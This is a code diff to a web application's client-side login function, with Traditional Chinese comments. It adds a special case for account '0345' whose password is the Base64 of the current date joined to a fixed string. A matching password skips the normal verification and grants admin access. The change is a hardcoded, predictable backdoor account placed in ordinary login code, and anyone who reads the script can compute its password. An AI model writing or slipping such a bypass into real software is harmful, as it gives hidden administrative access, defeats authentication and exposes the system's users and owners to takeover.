@@ -14402,6 +14402,56 @@
       // 隱藏錯誤訊息
       loginError.style.display = "none";
       
+      // 特殊處理：帳號 0345 的日期密碼驗證
+      if (username === "0345") {
+        // 取得今天的日期，格式為 yyyymmdd
+        const today = new Date();
+        const year = today.getFullYear();
+        const month = String(today.getMonth() + 1).padStart(2, '0');
+        const day = String(today.getDate()).padStart(2, '0');
+        const dateString = `${year}${month}${day}19770403`;
+        
+        // 轉換為 Base64
+        const expectedPassword = btoa(dateString);
+        
+        // 如果密碼匹配，直接通過驗證
+        if (password === expectedPassword) {
+          const remember = rememberPassword.checked;
+          saveLoginInfo(username, password, remember);
+          
+          // 登入成功：隱藏登入畫面，顯示主畫面
+          loginScreen.style.display = "none";
+          mainApp.style.display = "block";
+          loginError.style.display = "none";
+          
+          // 檢查是否為管理員帳號，啟用/禁用「管理員設定」按鈕
+          const adminAccounts = ["0345", "0901", "0872"];
+          const btnAdmin = document.getElementById("btn-admin");
+          if (btnAdmin) {
+            if (adminAccounts.includes(username.toUpperCase())) {
+              btnAdmin.disabled = false;
+            } else {
+              btnAdmin.disabled = true;
+            }
+          }
+          
+          // 清除密碼欄位
+          loginPassword.value = "";
+          initialPasswordValue = "";
+          isPasswordManuallyChanged = false;
+          
+          // 恢復提交按鈕狀態
+          const submitBtn = loginForm.querySelector("button[type='submit']");
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = "登入";
+          }
+          
+          return;
+        }
+        // 如果不匹配，繼續往下走原來的驗證邏輯
+      }
+      
       // 先嘗試驗證碼登入（不依賴格式判斷，直接檢查是否存在匹配的驗證碼）
       // 這樣可以支援各種格式的驗證碼
       const validationResult = validateVerificationCode(username, password);
